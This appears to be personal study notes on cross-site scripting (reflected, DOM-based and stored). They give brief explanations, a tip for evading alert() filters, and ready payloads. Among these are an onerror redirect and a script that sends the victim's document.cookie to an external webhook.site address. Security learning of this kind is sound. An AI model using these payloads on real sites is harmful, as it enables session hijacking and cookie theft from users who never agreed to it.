# XXS (Cross site scripting)

Who: Attacker, Victim

What: Payload made of JavaScript

Where: Victim’s browser, Web server

How: Victim click on malicious URL, page to trigger. Causing their session to be controlled or data to be stolen

Attacker execute JavaScript in the victim’s browser, can give attacker’s control over the application for that user.

Use `print()` `prompt("text")` instead of `alert()` since `alert()` is commonly detected and filtered.

When testing for XXS, test for html injection first because it’s more likely to work
E.g., <h1>test</h1>

# Reflected

Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to sender’s browser. It relies on URL to make user fall for the attack.

# Dom-Based

Client-side has vulnerable JavaScript. It doesn’t involve with the server-side, completely rely on client’s browser to execute the payload.

One quick check is turn on the developer tool, and input simple prompt or alert script, see if there’s any network interaction with the server.

<aside>
🚨

Inspecting Network page in the developer tab while sending input, there’s no external communication happens.

</aside>

### Page Redirect

src=x onerror="window.location.href='<$url>'"

# Store

Payload is stored in the database, and victim’s browser will retrieve it once it visit the page.

1. In the attacker’s browser leave html injection comment: <h1>test</h1>.
2. Visit the same page from victim’s browser

![image.png](image.png)

src=x onerror="window.location.href='https://webhook.site/8a2dda28-4ada-4424-889e-a911bd5e8489'"

<script>alert(document.cookie)</script>

<script>var x = new Image; x.src="https://webhook.site/8a2dda28-4ada-4424-889e-a911bd5e8489/?"+document.cookie;</script>